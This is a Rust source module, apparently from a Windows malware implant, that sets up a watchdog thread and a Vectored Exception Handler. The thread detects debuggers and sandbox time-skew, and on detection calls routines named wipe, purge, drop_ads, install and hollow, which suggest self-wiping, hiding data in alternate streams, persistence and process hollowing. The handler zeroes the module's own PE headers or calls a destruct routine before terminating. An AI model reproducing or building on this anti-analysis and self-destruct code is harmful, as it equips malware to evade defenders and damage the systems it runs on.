//! guardian.rs — Watchdog thread + VEH installer
//!
//! start_thread() spawns a background thread that periodically checks
//! process integrity (parent process, debugger, hook presence) and
//! triggers remediation if tampering is detected.
//!
//! install_veh() registers a Vectored Exception Handler so that any
//! unhandled exception triggers full_destruct() rather than a crash dump.

#![allow(dead_code, non_snake_case, clippy::too_many_arguments)]

use winapi::um::processthreadsapi::{
    CreateThread, GetCurrentProcess,
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::debugapi::IsDebuggerPresent;
use winapi::shared::minwindef::{DWORD, LPVOID};

// ── Public type aliases ─────────────────────────────────────────────────────────
// These are pub so indirect_syscall.rs can reference crate::guardian::* for
// the resolve_* return types without duplicating the signatures.

/// NtQuerySystemInformation(SystemInformationClass, Buffer, Length, *ReturnLength)
pub type NtQuerySystemInformation =
    unsafe fn(usize, *mut u8, usize, *mut u32) -> i32;

/// Sleep(dwMilliseconds)
pub type Sleep = unsafe fn(u32);

/// GetTickCount64() -> u64
pub type GetTickCount64 = unsafe fn() -> u64;

/// AddVectoredExceptionHandler(First, Handler) -> PVOID
pub type AddVectoredExceptionHandler = unsafe fn(usize, *const u8) -> usize;

// Private convenience aliases used only inside this module
type FnNtqsi  = NtQuerySystemInformation;
type FnSleep  = Sleep;
type FnTick   = GetTickCount64;
type FnAddVeh = AddVectoredExceptionHandler;
type FnVoid   = unsafe fn();
type FnBool   = unsafe fn() -> bool;

// Shared state passed into the guardian thread via a heap-allocated box
struct GuardState {
    fn_ntqsi:    FnNtqsi,
    fn_sleep:    FnSleep,
    fn_tick:     FnTick,
    fn_wipe:     FnVoid,
    fn_purge:    FnVoid,
    fn_drop_ads: FnVoid,
    fn_install:  FnVoid,
    fn_hollow:   FnBool,
    fn_destruct: FnVoid,   // called by VEH handler on unhandled exception
}

/// The guardian thread body. Runs in a loop checking for debugger / time skew.
unsafe extern "system" fn guardian_thread(param: LPVOID) -> DWORD {
    let state = &*(param as *const GuardState);
    let check_interval_ms: u32 = 5_000;
    let mut ticks_last = (state.fn_tick)();

    loop {
        (state.fn_sleep)(check_interval_ms);

        // Debugger check
        if IsDebuggerPresent() != 0 {
            (state.fn_wipe)();
            winapi::um::processthreadsapi::TerminateProcess(GetCurrentProcess(), 0);
        }

        // Time-skew check (sleep took much longer than expected = sandbox)
        let ticks_now = (state.fn_tick)();
        let elapsed = ticks_now.wrapping_sub(ticks_last) as u32;
        ticks_last = ticks_now;
        if elapsed > check_interval_ms * 4 {
            (state.fn_wipe)();
            (state.fn_purge)();
            (state.fn_drop_ads)();
            (state.fn_install)();
            let _ = (state.fn_hollow)();
        }
    }
}

// VEH state — stored separately so the handler closure can reach fn_destruct
// without owning the full GuardState box.
static mut VEH_DESTRUCT: Option<FnVoid> = None;

/// VEH handler: on any unhandled exception, call fn_destruct then terminate.
unsafe extern "system" fn veh_handler(_ex: LPVOID) -> i32 {
    if let Some(f) = VEH_DESTRUCT {
        f();
    } else {
        // Fallback: zero own PE headers inline if fn_destruct wasn't set
        let own_base: usize;
        core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
        let own_base = (own_base & !0xFFFF) as *mut u8;
        core::ptr::write_bytes(own_base, 0u8, 4096);
    }
    winapi::um::processthreadsapi::TerminateProcess(GetCurrentProcess(), 1);
    0 // EXCEPTION_CONTINUE_SEARCH — unreachable but required
}

/// Install a Vectored Exception Handler using the resolved fn ptr.
/// `fn_destruct` will be called by the handler before terminating.
pub unsafe fn install_veh(fn_add_veh: FnAddVeh, fn_destruct: FnVoid) {
    VEH_DESTRUCT = Some(fn_destruct);
    (fn_add_veh)(1, veh_handler as *const u8);
}

/// Spawn the guardian watchdog thread.
pub unsafe fn start_thread(
    fn_ntqsi:    FnNtqsi,
    fn_sleep:    FnSleep,
    fn_tick:     FnTick,
    fn_wipe:     FnVoid,
    fn_purge:    FnVoid,
    fn_drop_ads: FnVoid,
    fn_install:  FnVoid,
    fn_hollow:   FnBool,
) {
    // fn_destruct defaults to fn_wipe for the guardian's own use.
    // The VEH-specific fn_destruct is set separately via install_veh().
    let fn_destruct: FnVoid = fn_wipe;

    let state = Box::new(GuardState {
        fn_ntqsi,
        fn_sleep,
        fn_tick,
        fn_wipe,
        fn_purge,
        fn_drop_ads,
        fn_install,
        fn_hollow,
        fn_destruct,
    });
    let state_ptr = Box::into_raw(state) as LPVOID;

    let mut tid: DWORD = 0;
    let h = CreateThread(
        core::ptr::null_mut(), 0,
        Some(guardian_thread), state_ptr,
        0, &mut tid,
    );
    if !h.is_null() {
        CloseHandle(h);
    } else {
        // Thread creation failed — reclaim Box to avoid leak
        let _ = Box::from_raw(state_ptr as *mut GuardState);
    }
}
